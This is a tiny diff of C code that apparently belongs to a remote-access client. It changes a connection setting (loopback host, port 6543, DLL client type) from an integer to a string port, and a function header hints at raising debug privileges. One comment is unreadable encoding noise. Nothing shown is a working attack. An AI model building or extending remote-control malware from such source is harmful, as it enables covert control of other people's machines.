@@ -25,7 +25,7 @@ IsExit bExit = NULL;
 
 BOOL status = 0;
 
-CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN, "127.0.0.1", 6543, CLIENT_TYPE_DLL };
+CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN, "127.0.0.1", "6543", CLIENT_TYPE_DLL };
 
 //Ã·…˝»®œﬁ
 void DebugPrivilege()
